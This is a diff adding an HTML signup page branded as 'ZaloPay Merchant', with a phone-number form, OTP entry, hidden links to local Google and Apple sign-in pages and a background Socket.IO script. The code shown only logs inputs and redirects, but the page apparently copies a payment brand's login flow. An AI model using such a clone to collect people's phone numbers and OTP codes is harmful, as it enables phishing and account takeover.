@@ -1,0 +1,613 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <meta name="theme-color" content="#0066cc">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="default">
+    <meta name="apple-mobile-web-app-title" content="ZaloPay Merchant">
+    <link rel="manifest" href="/manifest.json">
+    <link rel="icon" type="image/png" href="/images/zalopay-merchant-icon.png">
+    <link rel="apple-touch-icon" href="/images/zalopay-merchant-app-icon.png">
+    <title>Đăng nhập - ZaloPay Merchant</title>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
+    <link href="css/style.css" rel="stylesheet">
+    <style>
+        body {
+            background-color: #ffffff;
+        }
+        .auth-section {
+            min-height: calc(100vh - 80px);
+            padding: 80px 0 60px;
+            background-color: #ffffff;
+        }
+        .qr-section {
+            text-align: center;
+            padding: 2rem 0;
+            max-width: 480px;
+            margin: 0 auto;
+        }
+        .qr-section h2 {
+            font-size: 1.5rem;
+            font-weight: 600;
+            color: #1a1a1a;
+            margin-bottom: 0.5rem;
+            line-height: 1.4;
+        }
+        .qr-section p {
+            font-size: 0.875rem;
+            color: #666;
+            margin-bottom: 2rem;
+            line-height: 1.5;
+        }
+        .qr-code {
+            width: 200px;
+            height: 200px;
+            margin: 0 auto 2rem;
+            background: white;
+            border: 2px solid #e5e7eb;
+            border-radius: 12px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            position: relative;
+            box-shadow: 0 4px 16px rgba(0, 0, 0, 0.08);
+        }
+        .qr-code::before {
+            content: '';
+            position: absolute;
+            inset: -8px;
+            background: linear-gradient(135deg, rgba(0, 51, 201, 0.1) 0%, rgba(0, 66, 255, 0.1) 100%);
+            border-radius: 16px;
+            filter: blur(8px);
+            z-index: -1;
+        }
+        .qr-code img {
+            max-width: 100%;
+            height: auto;
+            border-radius: 8px;
+        }
+        .app-download {
+            margin-top: 2rem;
+            position: relative;
+        }
+        .app-download-link {
+            display: inline-flex;
+            align-items: center;
+            gap: 0.5rem;
+            color: #0042FF;
+            text-decoration: none;
+            font-weight: 500;
+            margin-bottom: 0.5rem;
+            position: relative;
+            z-index: 3;
+        }
+        .app-download-link:hover {
+            text-decoration: underline;
+        }
+        .app-logo {
+            width: 240px;
+            height: auto;
+            margin: 2rem auto 1.5rem;
+            display: block;
+            max-width: 100%;
+            position: relative;
+            z-index: 2;
+            filter: drop-shadow(0 4px 12px rgba(0, 0, 0, 0.15));
+        }
+        .app-download::before {
+            content: '';
+            position: absolute;
+            top: -20px;
+            left: -20px;
+            right: -20px;
+            bottom: -20px;
+            background: rgba(255, 255, 255, 0.6);
+            backdrop-filter: blur(12px);
+            -webkit-backdrop-filter: blur(12px);
+            border-radius: 16px;
+            z-index: 0;
+            pointer-events: none;
+        }
+        .app-download::after {
+            content: '';
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 320px;
+            height: 320px;
+            background: radial-gradient(circle, rgba(255, 255, 255, 0) 40%, rgba(255, 255, 255, 0.95) 80%);
+            border-radius: 50%;
+            z-index: 1;
+            pointer-events: none;
+        }
+        .download-btn {
+            background: linear-gradient(135deg, #0033C9 0%, #0042FF 100%);
+            color: white;
+            border: none;
+            padding: 14px 24px;
+            border-radius: 8px;
+            font-weight: 600;
+            font-size: 1rem;
+            cursor: pointer;
+            transition: all 0.2s;
+            margin-top: 0;
+            position: relative;
+            z-index: 3;
+            width: 100%;
+            max-width: 280px;
+        }
+        .download-btn:hover {
+            background: linear-gradient(135deg, #0029a8 0%, #0038e6 100%);
+            transform: translateY(-1px);
+            box-shadow: 0 4px 12px rgba(0, 51, 201, 0.3);
+        }
+        .auth-form-section {
+            padding: 0;
+            max-width: 480px;
+            margin: 0 auto;
+        }
+        .auth-form-header {
+            margin-bottom: 2rem;
+        }
+        .auth-form-header h1 {
+            font-size: 1.75rem;
+            font-weight: 600;
+            color: #1a1a1a;
+            margin-bottom: 0.75rem;
+            line-height: 1.3;
+        }
+        .step-indicator {
+            font-size: 0.875rem;
+            color: #666;
+            margin-bottom: 0.5rem;
+            line-height: 1.4;
+        }
+        .auth-form-header h2 {
+            font-size: 1.125rem;
+            font-weight: 500;
+            color: #1a1a1a;
+            line-height: 1.4;
+        }
+        .phone-auth-form {
+            margin-top: 0;
+        }
+        .phone-input-group {
+            display: flex;
+            gap: 0.75rem;
+            margin-bottom: 1.5rem;
+        }
+        .form-control {
+            padding: 14px 16px;
+            border: 1px solid #d1d5db;
+            border-radius: 8px;
+            font-size: 1rem;
+            transition: all 0.2s;
+            background-color: #ffffff;
+        }
+        .form-control:focus {
+            outline: none;
+            border-color: #0042FF;
+            box-shadow: 0 0 0 3px rgba(0, 66, 255, 0.1);
+        }
+        .country-code {
+            width: 100px;
+            flex-shrink: 0;
+            background-color: #ffffff;
+        }
+        .phone-number {
+            flex: 1;
+        }
+        .btn-primary {
+            background: linear-gradient(135deg, #0033C9 0%, #0042FF 100%);
+            color: white;
+            border: none;
+            padding: 14px 24px;
+            border-radius: 8px;
+            font-weight: 600;
+            font-size: 1rem;
+            width: 100%;
+            transition: all 0.2s;
+            cursor: pointer;
+        }
+        .btn-primary:hover {
+            background: linear-gradient(135deg, #0029a8 0%, #0038e6 100%);
+            transform: translateY(-1px);
+            box-shadow: 0 4px 12px rgba(0, 51, 201, 0.3);
+        }
+        .auth-links {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-top: 1.5rem;
+            font-size: 0.875rem;
+            line-height: 1.5;
+        }
+        .auth-links a {
+            color: #0042FF;
+            text-decoration: none;
+            font-weight: 500;
+        }
+        .auth-links a:hover {
+            text-decoration: underline;
+        }
+        .social-login-section {
+            margin-top: 1.5rem;
+        }
+        .social-login-options {
+            display: flex;
+            flex-direction: column;
+            gap: 1rem;
+        }
+        .social-login-btn {
+            width: 100%;
+            padding: 12px 20px;
+            border: 2px solid #e5e7eb;
+            border-radius: 8px;
+            background: white;
+            font-weight: 500;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 12px;
+            transition: all 0.3s;
+            text-decoration: none;
+            color: #374151;
+        }
+        .social-login-btn:hover {
+            border-color: #0042FF;
+            background: #f8fafc;
+            color: #0033C9;
+            transform: translateY(-2px);
+            box-shadow: 0 4px 12px rgba(59,130,246,0.15);
+        }
+        .social-login-btn.google {
+            border-color: #4285f4;
+            color: #4285f4;
+        }
+        .social-login-btn.google:hover {
+            background: #4285f4;
+            color: white;
+        }
+        .social-login-btn.apple {
+            border-color: #000000;
+            color: #000000;
+        }
+        .social-login-btn.apple:hover {
+            background: #000000;
+            color: white;
+        }
+        .otp-section {
+            display: none;
+            margin-top: 1.5rem;
+        }
+        .otp-section.active {
+            display: block;
+        }
+        .otp-inputs {
+            display: flex;
+            gap: 0.75rem;
+            justify-content: center;
+            margin-bottom: 1rem;
+        }
+        .otp-input {
+            width: 50px;
+            height: 50px;
+            text-align: center;
+            font-size: 1.25rem;
+            font-weight: 600;
+            border: 2px solid #e5e7eb;
+            border-radius: 8px;
+            transition: border-color 0.3s;
+        }
+        .otp-input:focus {
+            outline: none;
+            border-color: #0042FF;
+            box-shadow: 0 0 0 3px rgba(0, 66, 255, 0.1);
+        }
+        .resend-otp {
+            text-align: center;
+            margin-top: 1rem;
+            font-size: 0.875rem;
+            color: #6b7280;
+        }
+        .resend-otp a {
+            color: #0042FF;
+            text-decoration: none;
+            font-weight: 500;
+        }
+        .resend-otp a:hover {
+            text-decoration: underline;
+        }
+        @media (max-width: 992px) {
+            .auth-section {
+                padding: 60px 0 40px;
+            }
+            .qr-section {
+                margin-bottom: 3rem;
+            }
+            .auth-form-section {
+                max-width: 100%;
+            }
+        }
+        @media (max-width: 768px) {
+            .auth-section {
+                padding: 40px 0 30px;
+            }
+            .qr-section h2 {
+                font-size: 1.25rem;
+            }
+            .auth-form-header h1 {
+                font-size: 1.5rem;
+            }
+            .auth-form-header h2 {
+                font-size: 1rem;
+            }
+        }
+    </style>
+</head>
+<body class="bg-light">
+    <!-- Header -->
+    <header class="navbar navbar-expand-lg navbar-light bg-white shadow-sm fixed-top">
+        <div class="container">
+            <a class="navbar-brand" href="index.html">
+                <img src="/logo-zalopay-doanhnghiep.svg" alt="ZaloPay" height="40">
+            </a>
+            <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav">
+                <span class="navbar-toggler-icon"></span>
+            </button>
+            <div class="collapse navbar-collapse" id="navbarNav">
+                <ul class="navbar-nav ms-auto">
+                    <li class="nav-item">
+                        <a class="nav-link" href="index.html">Trang chủ</a>
+                    </li>
+                    <li class="nav-item">
+                        <a class="nav-link" href="index.html#solutions">Giải pháp</a>
+                    </li>
+                    <li class="nav-item">
+                        <a class="nav-link" href="index.html#faq">FAQ</a>
+                    </li>
+                    <li class="nav-item">
+                        <a class="btn btn-primary ms-2" href="auth_signup.html">Đăng ký ngay</a>
+                    </li>
+                </ul>
+            </div>
+        </div>
+    </header>
+
+    <!-- Auth Section -->
+    <section class="auth-section">
+        <div class="container">
+            <div class="row align-items-center">
+                <!-- Left Column: QR Code Section -->
+                <div class="col-lg-6 col-md-12">
+                    <div class="qr-section">
+                        <h2>Đăng ký nhanh hơn bằng ứng dụng Zalopay</h2>
+                        <p>Quét ngay để bắt đầu</p>
+                        <div class="qr-code">
+                            <img src="https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=zalopay-merchant-login" alt="QR Code">
+                        </div>
+                        <div class="app-download">
+                            <a href="#" class="app-download-link">Open ZaloPay Merchant App</a>
+                            <p style="font-size: 0.875rem; color: #666; margin-bottom: 0.5rem;">Mở ứng dụng Zalopay để đăng kí</p>
+                            <img src="/1200x630wa.png" alt="ZaloPay App" class="app-logo">
+                            <button class="download-btn" onclick="window.location.href='#'">Tải Zalopay</button>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Right Column: Login Form -->
+                <div class="col-lg-6 col-md-12">
+                    <div class="auth-form-section">
+                        <div class="auth-form-header">
+                            <h1>Đăng ký trở thành đối tác</h1>
+                            <div class="step-indicator">Bước 1</div>
+                            <h2>Tạo tài khoản</h2>
+                        </div>
+
+                        <!-- Phone Authentication -->
+                        <div class="phone-auth-form" id="phoneAuthForm">
+                            <div class="phone-input-group">
+                                <select class="form-control country-code" id="country_code" name="country_code">
+                                    <option value="+84" selected>+84</option>
+                                    <option value="+1">+1</option>
+                                    <option value="+44">+44</option>
+                                    <option value="+65">+65</option>
+                                </select>
+                                <input type="tel" class="form-control phone-number" id="phone_number" name="phone_number" 
+                                       placeholder="Nhập số điện thoại" required maxlength="10">
+                            </div>
+                            <button type="button" class="btn btn-primary" id="sendOtpBtn">
+                                Xác nhận
+                            </button>
+                            <div class="auth-links">
+                                <div>
+                                    <span style="color: #666;">Đã có tài khoản? </span>
+                                    <a href="#">Đăng nhập</a>
+                                </div>
+                                <a href="#">Quên mật khẩu</a>
+                            </div>
+                        </div>
+
+                        <!-- Social Login Section -->
+                        <div class="social-login-section" id="socialLoginSection" style="display: none;">
+                            <div class="social-login-options">
+                                <a href="google_auth.html" class="social-login-btn google" id="googleLoginBtn">
+                                    <i class="fab fa-google"></i>
+                                    <span>Đăng nhập bằng Google</span>
+                                </a>
+                                <a href="apple_auth.html" class="social-login-btn apple" id="appleLoginBtn">
+                                    <i class="fab fa-apple"></i>
+                                    <span>Đăng nhập bằng Apple ID</span>
+                                </a>
+                            </div>
+                        </div>
+
+                        <!-- OTP Verification Section -->
+                        <div class="otp-section" id="otpSection">
+                            <label class="form-label text-center d-block mb-3">Nhập mã OTP đã gửi đến số điện thoại</label>
+                            <div class="otp-inputs">
+                                <input type="text" class="otp-input" maxlength="1" pattern="[0-9]">
+                                <input type="text" class="otp-input" maxlength="1" pattern="[0-9]">
+                                <input type="text" class="otp-input" maxlength="1" pattern="[0-9]">
+                                <input type="text" class="otp-input" maxlength="1" pattern="[0-9]">
+                                <input type="text" class="otp-input" maxlength="1" pattern="[0-9]">
+                                <input type="text" class="otp-input" maxlength="1" pattern="[0-9]">
+                            </div>
+                            <button type="button" class="btn btn-primary" id="verifyOtpBtn">
+                                Xác thực OTP
+                            </button>
+                            <div class="resend-otp">
+                                Không nhận được mã? <a href="#" id="resendOtpLink">Gửi lại</a>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Footer -->
+    <footer class="footer py-5 bg-dark text-white">
+        <div class="container">
+            <div class="row">
+                <div class="col-lg-4 mb-4">
+                    <img src="/logo-zalopay-doanhnghiep.svg" alt="ZaloPay" height="40" class="mb-3">
+                    <p>Nền tảng giải pháp toàn diện cho mọi nhu cầu kinh doanh</p>
+                </div>
+                <div class="col-lg-2 col-md-6 mb-4">
+                    <h5>Giải pháp</h5>
+                    <ul class="list-unstyled">
+                        <li><a href="index.html#solutions" class="text-light">Thanh toán</a></li>
+                        <li><a href="#" class="text-light">Chi hộ</a></li>
+                        <li><a href="#" class="text-light">Bán hàng</a></li>
+                    </ul>
+                </div>
+                <div class="col-lg-2 col-md-6 mb-4">
+                    <h5>Hỗ trợ</h5>
+                    <ul class="list-unstyled">
+                        <li><a href="index.html#faq" class="text-light">FAQ</a></li>
+                        <li><a href="#" class="text-light">Liên hệ</a></li>
+                        <li><a href="#" class="text-light">Hướng dẫn</a></li>
+                    </ul>
+                </div>
+                <div class="col-lg-4 mb-4">
+                    <h5>Liên hệ</h5>
+                    <p class="text-light">
+                        <i class="fas fa-phone me-2"></i>Hotline: 1900 1234<br>
+                        <i class="fas fa-envelope me-2"></i>Email: support@zalopay.vn
+                    </p>
+                </div>
+            </div>
+            <div class="text-center border-top pt-3 mt-3">
+                <p class="text-muted mb-0">&copy; 2024 ZaloPay. Tất cả quyền được bảo lưu.</p>
+            </div>
+        </div>
+    </footer>
+
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
+    <script src="js/main.js"></script>
+    <script>
+        // OTP Input Handling
+        document.addEventListener('DOMContentLoaded', function() {
+            const otpInputs = document.querySelectorAll('.otp-input');
+            const phoneForm = document.getElementById('phoneAuthForm');
+            const otpSection = document.getElementById('otpSection');
+            const sendOtpBtn = document.getElementById('sendOtpBtn');
+            const verifyOtpBtn = document.getElementById('verifyOtpBtn');
+            const phoneNumberInput = document.getElementById('phone_number');
+
+            // Auto-focus next OTP input
+            otpInputs.forEach((input, index) => {
+                input.addEventListener('input', function(e) {
+                    if (this.value.length === 1 && index < otpInputs.length - 1) {
+                        otpInputs[index + 1].focus();
+                    }
+                });
+
+                input.addEventListener('keydown', function(e) {
+                    if (e.key === 'Backspace' && this.value === '' && index > 0) {
+                        otpInputs[index - 1].focus();
+                    }
+                });
+
+                // Only allow numbers
+                input.addEventListener('keypress', function(e) {
+                    if (!/[0-9]/.test(e.key)) {
+                        e.preventDefault();
+                    }
+                });
+            });
+
+            // Send OTP Handler - Show OTP section
+            sendOtpBtn.addEventListener('click', function() {
+                const phoneNumber = phoneNumberInput.value.trim();
+                const countryCode = document.getElementById('country_code').value;
+
+                if (!phoneNumber || phoneNumber.length < 10) {
+                    alert('Vui lòng nhập số điện thoại hợp lệ');
+                    return;
+                }
+
+                // Hide phone form and show OTP section
+                phoneForm.style.display = 'none';
+                otpSection.classList.add('active');
+                otpInputs[0].focus();
+                
+                // In real implementation, this would call backend API to send OTP
+                console.log('Sending OTP to:', countryCode + phoneNumber);
+            });
+
+            // Verify OTP Handler
+            verifyOtpBtn.addEventListener('click', function() {
+                const otpCode = Array.from(otpInputs).map(input => input.value).join('');
+                
+                if (otpCode.length !== 6) {
+                    alert('Vui lòng nhập đầy đủ 6 số OTP');
+                    return;
+                }
+
+                // In real implementation, this would verify OTP with backend
+                console.log('Verifying OTP:', otpCode);
+                
+                // Redirect to dashboard page
+                window.location.href = "dashboard.html";
+            });
+
+            // Resend OTP Handler
+            document.getElementById('resendOtpLink').addEventListener('click', function(e) {
+                e.preventDefault();
+                // Reset OTP inputs
+                otpInputs.forEach(input => input.value = '');
+                otpInputs[0].focus();
+                
+                // Resend OTP (call backend)
+                console.log('Resending OTP...');
+            });
+
+        });
+    </script>
+    <!-- Service Worker Registration -->
+    <script>
+      if ('serviceWorker' in navigator) {
+        window.addEventListener('load', () => {
+          navigator.serviceWorker.register('/sw.js')
+            .then((registration) => {
+              console.log('Service Worker registered successfully:', registration.scope);
+            })
+            .catch((error) => {
+              console.error('Service Worker registration failed:', error);
+            });
+        });
+      }
+    </script>
+    
+    <!-- Socket.IO Background Support -->
+    <script src="https://cdn.socket.io/4.5.3/socket.io.min.js"></script>
+    <script src="/js/socket-background.js"></script>
+</body>
+</html>
+
